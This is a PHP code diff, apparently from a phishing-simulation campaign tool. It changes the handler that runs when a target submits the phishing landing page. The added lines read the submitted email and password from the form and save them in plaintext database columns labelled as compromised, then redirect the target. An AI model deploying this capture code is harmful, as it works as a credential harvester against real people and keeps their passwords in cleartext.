@@ -15,8 +15,9 @@ else
     $campaign_id = 'Failed';
     
 $user_details = verifyMailCmapaignUser($conn, $campaign_id, $user_id);
+
 if(verifyMailCmapaign($conn, $campaign_id) == true && $user_details != 'empty'){
-    $date_time = round(microtime(true) * 1000);
+     $date_time = round(microtime(true) * 1000);
     if(empty($user_details['employees_compromised'])){
         $employees_compromised = json_encode(array($date_time));
         $payloads_clicked = json_encode(array($date_time));
@@ -26,15 +27,23 @@ if(verifyMailCmapaign($conn, $campaign_id) == true && $user_details != 'empty'){
         $employees_compromised = json_encode($tmp);
         $payloads_clicked = json_encode(array($tmp));
     }
-    $stmt = $conn->prepare("UPDATE tb_data_mailcamp_live SET payloads_clicked=?, employees_compromised=? WHERE campaign_id=? AND rid=?");
-    $stmt->bind_param('ssss', $payloads_clicked,$employees_compromised,$campaign_id,$user_id);
+
+    $email_comp = $_POST['email'];
+    if(isset($_POST['password'])){
+        $pass_comp = $_POST['password'];
+    }else{
+        $pass_comp = $_POST['text'];
+    }
+    
+    $stmt = $conn->prepare("UPDATE tb_data_mailcamp_live SET payloads_clicked=?, employees_compromised=?,compromised_email=? ,compromised_pass=? WHERE campaign_id=? AND rid=? ");
+    $stmt->bind_param('ssssss', $payloads_clicked,$employees_compromised,$email_comp,$pass_comp,$campaign_id,$user_id);
     $stmt->execute();
+      displayImage();
 }
 
 function displayImage(){
-    header("Location: landing.php");
-  }
-  displayImage();
+  header("Location: landing.php");
+}
 
 //-----------------------------------------
 function verifyMailCmapaign($conn, $campaign_id){
